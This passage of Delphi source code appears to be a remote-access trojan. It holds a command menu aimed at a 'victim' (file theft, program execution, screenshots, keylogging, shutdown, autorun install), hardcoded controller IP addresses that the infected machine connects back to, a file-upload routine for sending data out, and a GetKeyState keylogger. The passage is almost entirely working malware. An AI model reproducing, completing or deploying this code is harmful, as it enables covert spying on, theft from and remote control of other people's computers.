                        RETURN:=RETURN+'< SWD <path>    [set current directory]    (e.g. "swd c:\windows" , no ''\'' at the end)'+#13#10;
                        RETURN:=RETURN+'< PWD   [shows current directory]    (e.g. "pwd" returns ''c:\windows\tmp'')'+#13#10;
                        RETURN:=RETURN+'< DIR <*attributes>    [list current directory''s contents]    (e.g. "dir *tmp.sys")'+#13#10;
                        RETURN:=RETURN+'< CD <directory_name>    [choose subdirectory to go to]    (e.g. "cd temp")'+#13#10;
                        RETURN:=RETURN+'< CD..    [move to the previous directory]    (e.g. "cd..")'+#13#10;
                        RETURN:=RETURN+'< CD\    [move to root directory]    (e.g. "cd\")'+#13#10;
                        RETURN:=RETURN+'< COPY FILE <file_name> <path>    (e.g. "copy file system32.dll c:\")'+#13#10;
                        RETURN:=RETURN+'< RENAME FILE <file_name> <file_name>    (e.g. "rename file system32.dll newsys.dll")'+#13#10;
                        RETURN:=RETURN+'< DELETE FILE <file_name>    (e.g. "delete file stuff.txt")'+#13#10;
                        RETURN:=RETURN+'< DELETE DIRECTORY <directory_name>    (e.g. "delete directory temporary")'+#13#10;
                        RETURN:=RETURN+'< CREATE DIRECTORY <directory_name>    (e.g. "create directory mydir")'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;
                        RETURN:=RETURN+'< RETRIEVE FILE <file_name>    [downloads file from victim]    (e.g. "retrieve file ss.sys")'+#13#10;
                        RETURN:=RETURN+'< VIEW FILE <file_name>    [prints text-file]    (e.g. "view file text01.txt")'+#13#10;
                        RETURN:=RETURN+'< EXECUTE <file_name>    [executes an ''.exe'' file]    (e.g. "execute mplayer.exe")'+#13#10;
                        RETURN:=RETURN+'< PLAY <file_name>    [plays a music or video file]    (e.g. "play music.mp3")'+#13#10;
                        RETURN:=RETURN+'<'+#13#10;
                        RETURN:=RETURN+'< SCREENSHOT <file_name>    [save victim''s screenshot]    (e.g. "screenshot scr1.jpg")'+#13#10;
                        RETURN:=RETURN+'< KEYLOGGER.ON    [start keylogger]    (e.g. "keylogger.on")'+#13#10;
                        RETURN:=RETURN+'< KEYLOGGER.OFF    [stop keylogger]    (e.g. "keylogger.off")'+#13#10;
                        RETURN:=RETURN+'< KEYLOGGER.SHOW    [show keys pressed by victim]    (e.g. "keylogger.show")'+#13#10;
                        RETURN:=RETURN+'< SEND MESSAGE <message>    [send a message to victim]    (e.g. "send message "Hi!""'+#13#10;
                        RETURN:=RETURN+'< CHAT <message>    [send message to the victim and wait for a reply]'+#13#10;
                        RETURN:=RETURN+'< CDTRAY.EJECT    [eject cd tray]    (e.g. "cdtray.eject")'+#13#10;
                        RETURN:=RETURN+'< CDTRAY.CLOSE    [close cd tray]    (e.g. "cdtray.close")'+#13#10;
                        RETURN:=RETURN+'< BEEP <*times>    [play a ''beep'' sound for some times]    (e.g. "beep 3")'+#13#10;
                        RETURN:=RETURN+'< SHUTDOWN    [shutdown victim''s computer]    (e.g. "shutdown")'+#13#10;
                        RETURN:=RETURN+'< REBOOT    [reboot victim''s computer]    (e.g. "reboot")'+#13#10;
                        RETURN:=RETURN+'< LOGOFF    [logoff victim''s current user]    (e.g. "logoff")'+#13#10;
                        RETURN:=RETURN+'< INSTALL    [install trojan and make it ''autorun'' at windows start-up]    (e.g. "install")'+#13#10;
                        RETURN:=RETURN+'< KILL    [shutdown trojan application on victim''s computer]    (e.g. "kill")'+#13#10;
                end
                else RETURN:='< error: command not recogniseable!';

                toConsole.Socket.SendText(RETURN);
        end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
        application.OnException:=appException;
        USER_IP[1]:='195.251.192.58';
        USER_IP[2]:='195.251.192.59';
        USER_IP[3]:='195.251.192.60';
        USER_IP[4]:='195.251.192.61';
        USER_IP[5]:='195.251.192.62';
        USER_IP[6]:='195.251.192.63';
        USER_IP[7]:='195.251.192.64';
        USER_IP[8]:='195.251.192.65';
        USER_IP[9]:='195.251.192.66';
        USER_IP[10]:='195.251.192.67';
        USER_IP[11]:='195.251.192.68';
        USER_IP[12]:='195.251.192.69';
        USER_IP[13]:='195.251.192.70';
        USER_IP[14]:='195.251.192.71';
        USER_IP[15]:='195.251.192.72';
        USER_IP[16]:='195.251.192.73';
        USER_IP[11]:='195.251.192.74';
        USER_IP[12]:='195.251.192.75';
        USER_IP[13]:='195.251.192.76';
        USER_IP[14]:='195.251.192.77';
        USER_IP[15]:='195.251.192.78';
        USER_IP[16]:='195.251.192.79';
        USER_IP[17]:='127.0.0.1';

        fromConsole.Port:=MAIN_TROJAN_PORT;
        fromConsole.Open;
end;

procedure TForm1.fromCONSOLEClientConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
        nextIP:=1;
        timer2.Enabled:=true;

end;

procedure TForm1.fromCONSOLEClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
        toConsole.Active:=false;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
        try
                toConsole.Host:=USER_IP[NextIP];
                toConsole.Port:=MAIN_CONSOLE_PORT;
                toConsole.Open;
                toTransferConsole.Host:=USER_IP[nextIP];
                toTransferConsole.Port:=TRANSFER_CONSOLE_PORT;
                toTransferConsole.Open;
                if nextIP<17 then nextIP:=nextIP+1;
        except

        end;
end;

procedure TForm1.toCONSOLEConnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
        timer2.Enabled:=false;
end;

Procedure SendBloc;     { SOURCE DOWNLOADED SEPARATELY }
Begin
  With ClientTrame Do
  Begin
    ttType:=2;
    Seek(FILE_ONTRANSFER,ttDebut);
    BlockRead(FILE_ONTRANSFER,ttDatas,TailleBloc,ttLong);
    Form1.toTransferConsole.Socket.SendBuf(ClientTrame,ttLong+12);
  End;
End;

procedure TForm1.ClientRead(Sender: TObject; Socket: TCustomWinSocket);    { SOURCE DOWNLOADED SEPARATELY }
Var
        CodeRetour:Integer;
begin
  With ClientTrame Do
  Begin
    Socket.ReceiveBuf(CodeRetour,4);

    Case ttType Of
      1:Begin
          If CodeRetour=0
          Then Begin
            ttDebut:=0;
            SendBloc;
          End;
        End;

      2:Begin
          If CodeRetour=0
          Then Begin
            Inc(ttDebut,ttLong);
            If ttDebut>=FileSize(FILE_ONTRANSFER)
              Then begin end
              Else SendBloc;
          End
          Else Begin
            SendBloc;
          End;
        End;

      Else
        begin end
    End;
  End;

end;

procedure TForm1.RETARD_TIMERTimer(Sender: TObject);
begin
        Retard_timer.Enabled:=false;
        toTransferConsole.Socket.SendBuf(ClientTrame,4+length(ClientTrame.ttNomFichier)+1);
end;

procedure TForm1.Timer3Timer(Sender: TObject);
Var pos, c : integer;
begin
        for c:= 1 to 255 do begin;
        pos := GetKeyState(c);
        If Copy(IntToStr(pos),1,1) = '-' Then begin;
                KEYLOG:=KEYLOG+ chr(c);
        End;
End;
end;

end.
